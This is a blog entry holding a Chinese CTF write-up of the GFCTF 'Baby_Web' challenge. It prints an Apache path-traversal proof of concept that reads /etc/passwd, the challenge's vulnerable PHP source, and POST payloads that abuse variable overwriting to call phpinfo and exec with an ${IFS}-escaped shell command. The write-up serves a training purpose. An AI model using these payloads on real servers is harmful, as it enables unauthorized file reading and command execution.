<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Baby_Web</title>
    <link href="/2022/12/06/BabyWeb/"/>
    <url>/2022/12/06/BabyWeb/</url>
    
    <content type="html"><![CDATA[<p>题目首页</p><p><img src="/2022/12/06/BabyWeb/image-20221206164219690.png" alt="image-20221206164219690"></p><p>通过扫描发现了一个特殊的路径</p><p>&#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;etc&#x2F;passwd</p><p>这个路径是一个apache的漏洞，可以目录遍历，执行命令</p><p>测了一下命令执行是不可以的，可以目录遍历</p><p>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/cgi-bin/.%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/2022/12/06/BabyWeb/image-20221206164252785.png" alt="image-20221206164252785"></p><p>然后根据源代码里的提示信息，查看一下index.php.txt文件</p><p><img src="/2022/12/06/BabyWeb/image-20221206164309334.png" alt="image-20221206164309334"></p><p><img src="/2022/12/06/BabyWeb/image-20221206164317820.png" alt="image-20221206164317820"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;h1&gt;Welcome To GFCTF <span class="hljs-number">12</span>th!!&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;main&quot;</span>,<span class="hljs-string">&quot;main&quot;</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Class.php&quot;</span>;<br><span class="hljs-variable">$temp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Temp</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-variable">$temp</span>-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]);<br><br><span class="hljs-meta">?&gt;</span><br>&lt;!--源码藏在上层目录xxx.php.txt里面，但你怎么才能看到它呢?--&gt;<br></code></pre></td></tr></table></figure><p>再查看Class.php.txt</p><p><img src="/2022/12/06/BabyWeb/image-20221206164326650.png" alt="image-20221206164326650"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">defined</span>(<span class="hljs-string">&#x27;main&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!!&quot;</span>);<br>Class Temp&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$date</span>=[<span class="hljs-string">&#x27;version&#x27;</span>=&gt;<span class="hljs-string">&#x27;1.0&#x27;</span>,<span class="hljs-string">&#x27;img&#x27;</span>=&gt;<span class="hljs-string">&#x27;https://www.apache.org/img/asf-estd-1999-logo.jpg&#x27;</span>];<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$template</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;date = <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$this</span>-&gt;date,<span class="hljs-variable">$data</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTempName</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$dir</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dir</span> === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;template = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;..&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;./template/admin/&#x27;</span>.<span class="hljs-variable">$template</span>);<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$this</span>-&gt;template))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!!&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;template = <span class="hljs-string">&#x27;./template/index.html&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">display</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$space</span>=<span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br><br>        <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$this</span>-&gt;date);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getTempName</span>(<span class="hljs-variable">$template</span>,<span class="hljs-variable">$space</span>);<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;template);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listdata</span>(<span class="hljs-params"><span class="hljs-variable">$_params</span></span>)</span>&#123;<br>        <span class="hljs-variable">$system</span> = [<br>            <span class="hljs-string">&#x27;db&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;app&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;num&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;sum&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;form&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;page&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;site&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;flag&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;not_flag&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;show_flag&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;more&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;catid&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;field&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;order&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;space&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;table&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;table_site&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;total&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;join&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;on&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;action&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;return&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;sbpage&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;urlrule&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;pagesize&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;pagefile&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        ];<br><br>        <span class="hljs-variable">$param</span> = <span class="hljs-variable">$where</span> = [];<br><br>        <span class="hljs-variable">$_params</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_params</span>);<br><br>        <span class="hljs-variable">$params</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-variable">$_params</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>], [<span class="hljs-string">&#x27;list&#x27;</span>,<span class="hljs-string">&#x27;function&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;action=&#x27;</span>.<span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>];<br>        &#125;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$params</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$t</span>) &#123;<br>            <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$t</span>, <span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$t</span>, <span class="hljs-string">&#x27;=&#x27;</span>));<br>            <span class="hljs-variable">$val</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$t</span>, <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$t</span>, <span class="hljs-string">&#x27;=&#x27;</span>) + <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$var</span>) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$system</span>[<span class="hljs-variable">$var</span>])) &#123; <br>                <span class="hljs-variable">$system</span>[<span class="hljs-variable">$var</span>] = <span class="hljs-variable">$val</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$param</span>[<span class="hljs-variable">$var</span>] = <span class="hljs-variable">$val</span>; <br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// action</span><br>        <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &#123;<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;function&#x27;</span>:<br><br>                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>                    <span class="hljs-keyword">return</span>  <span class="hljs-string">&#x27;hacker!!&#x27;</span>;<br>                &#125; <span class="hljs-keyword">elseif</span> (!<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hacker!!&#x27;</span>;<br>                &#125;<br><br>                <span class="hljs-variable">$force</span> = <span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;force&#x27;</span>];<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$force</span>) &#123;<br>                    <span class="hljs-variable">$p</span> = [];<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$param</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span> =&gt; <span class="hljs-variable">$t</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$var</span>, <span class="hljs-string">&#x27;param&#x27;</span>) === <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-variable">$n</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$var</span>, <span class="hljs-number">5</span>));<br>                            <span class="hljs-variable">$p</span>[<span class="hljs-variable">$n</span>] = <span class="hljs-variable">$t</span>;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$p</span>) &#123;<br><br>                        <span class="hljs-variable">$rt</span> = <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-variable">$p</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$rt</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$rt</span>;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;list&#x27;</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$this</span>-&gt;date);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来分析代码结构</p><p>开始的地方在创建了Temp类，并且调用了display方法</p><p><img src="/2022/12/06/BabyWeb/image-20221206164339317.png" alt="image-20221206164339317"></p><p>创建类以后，第一步会将post请求传入的参数赋值到$data里面，然后和$this-&gt;data合并成一个数组</p><p><img src="/2022/12/06/BabyWeb/image-20221206164345744.png" alt="image-20221206164345744"></p><p>合并到一个数组以后，调用display方法，这里也就是变量覆盖的位置了</p><p><img src="/2022/12/06/BabyWeb/image-20221206164351684.png" alt="image-20221206164351684"></p><p>接着步入进去getTempName方法</p><p>dir等于admin的话，会将$template进行一个检测，不能有..出现，否则替换成空，并赋值给$this-&gt;template</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTempName</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$dir</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dir</span> === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;template = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;..&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;./template/admin/&#x27;</span>.<span class="hljs-variable">$template</span>);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$this</span>-&gt;template))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!!&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;template = <span class="hljs-string">&#x27;./template/index.html&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据上面我们知道了一个新的路径&#x2F;template&#x2F;admin，访问一下看看</p><p><img src="/2022/12/06/BabyWeb/image-20221206164359542.png" alt="image-20221206164359542"></p><p>可以看见这里又调用了listdata方法</p><p>根据目前所得到的信息，也能猜到，这是让我们要进入&#x2F;template&#x2F;admin这个路径里调用listdata方法</p><hr><p><strong>那么思路就来了，首先，post传参通过变量覆盖将space赋值成admin,get传参通过filename赋值成index.html，这样就可以进入&#x2F;template&#x2F;admin&#x2F;index.html这个路径了</strong></p><hr><p>接着我们再看listdata方法里都有什么东西</p><p>$system这个数组可以省略不看，我只说几个稍微关键一点的地方</p><p>这里的判断，我们是需要绕过的，$params[0]不能等于function，$params[0]这个位置我们需要它等于mod,所以这里我们待会可以随意传入一个值进去</p><p><img src="/2022/12/06/BabyWeb/image-20221206164407656.png" alt="image-20221206164407656"></p><p>这里是遍历新的数组</p><p><img src="/2022/12/06/BabyWeb/image-20221206164414361.png" alt="image-20221206164414361"></p><p>下面来到了关键的环节</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &#123;<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;function&#x27;</span>:<br><br>                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>                    <span class="hljs-keyword">return</span>  <span class="hljs-string">&#x27;hacker!!&#x27;</span>;<br>                &#125; <span class="hljs-keyword">elseif</span> (!<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hacker!!&#x27;</span>;<br>                &#125;<br><br>                <span class="hljs-variable">$force</span> = <span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;force&#x27;</span>];<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$force</span>) &#123;<br>                    <span class="hljs-variable">$p</span> = [];<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$param</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span> =&gt; <span class="hljs-variable">$t</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$var</span>, <span class="hljs-string">&#x27;param&#x27;</span>) === <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-variable">$n</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$var</span>, <span class="hljs-number">5</span>));<br>                            <span class="hljs-variable">$p</span>[<span class="hljs-variable">$n</span>] = <span class="hljs-variable">$t</span>;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$p</span>) &#123;<br><br>                        <span class="hljs-variable">$rt</span> = <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-variable">$p</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$rt</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$rt</span>;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;list&#x27;</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$this</span>-&gt;date);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure><p>$system[‘action’]里的值是function就会进入下面的判断</p><p>name值不能为空，name传进去的函数如果是已定义的，会返回true，然后就可以绕过了</p><p><img src="/2022/12/06/BabyWeb/image-20221206164423863.png" alt="image-20221206164423863"></p><p>再往下面走</p><p>判断$param[‘force’]必须要什么值都没有，不过$param数组里没有force这个键，所以直接也就进去了，foreach遍历param数组，判断键里面有没有param，没有，所以这个循环也没啥用。再往下走，判断p，如果有值，调用call_user_func_array，如果没有值调用call_user_func</p><p><img src="/2022/12/06/BabyWeb/image-20221206164429596.png" alt="image-20221206164429596"></p><p>一共两种方法，我们一一介绍一下</p><p>第一种</p><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">get: filename=index.html<br>post: space=admin&amp;mod=<span class="hljs-number">12345</span> action=<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>=<span class="hljs-title">phpinfo</span></span><br></code></pre></td></tr></table></figure><hr><p><img src="/2022/12/06/BabyWeb/image-20221206164438293.png" alt="image-20221206164438293"></p><p>然后在phpinfo里找到了flag</p><p><img src="/2022/12/06/BabyWeb/image-20221206164443698.png" alt="image-20221206164443698"></p><p>第二种</p><p>根据上面的phpinfo里面的disable_functions可以发现exec并没有被禁用<br>那么这一次我们需要在p赋值的那里进行一下改变了，name要等于exec，再新添加一个param等于我们要执行的命令</p><p><img src="/2022/12/06/BabyWeb/image-20221206164450335.png" alt="image-20221206164450335"></p><p>（这里循环解释一下，$param数组里如果找到param这个键便能进行下面的给p数组赋值的环节，$n什么也没有，关键的地方就是在于因为有了新的传参，有了param，所以param也就会被传入$p里）</p><p>下面开始构造payload，但是要主要的是，之前分割数组的时候，是以空格进行分割的，所以待会我们需要使用${IFS}进行绕过</p><p><img src="/2022/12/06/BabyWeb/image-20221206164455952.png" alt="image-20221206164455952"></p><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">get:  filename=index.html<br>post: space=admin&amp;mode=<span class="hljs-number">2134</span> action=<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>=<span class="hljs-title">exec</span> <span class="hljs-title">param</span>=<span class="hljs-title">ls</span>$</span>&#123;IFS&#125;/&gt;/<span class="hljs-keyword">var</span>/www/html/a<br></code></pre></td></tr></table></figure><hr><p><img src="/2022/12/06/BabyWeb/image-20221206164502176.png" alt="image-20221206164502176"></p><p><img src="/2022/12/06/BabyWeb/Users\林白\Desktop\md\img\image-20221206160100569.png" alt="image-20221206160100569"></p><p>查看根目录</p><p><img src="/2022/12/06/BabyWeb/image-20221206164530756.png" alt="image-20221206164530756"></p><p><img src="/2022/12/06/BabyWeb/image-20221206164512507.png" alt="image-20221206164512507"></p><p><img src="/2022/12/06/BabyWeb/image-20221206164540320.png" alt="image-20221206164540320"></p><p><img src="/2022/12/06/BabyWeb/image-20221206164545355.png" alt="image-20221206164545355"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
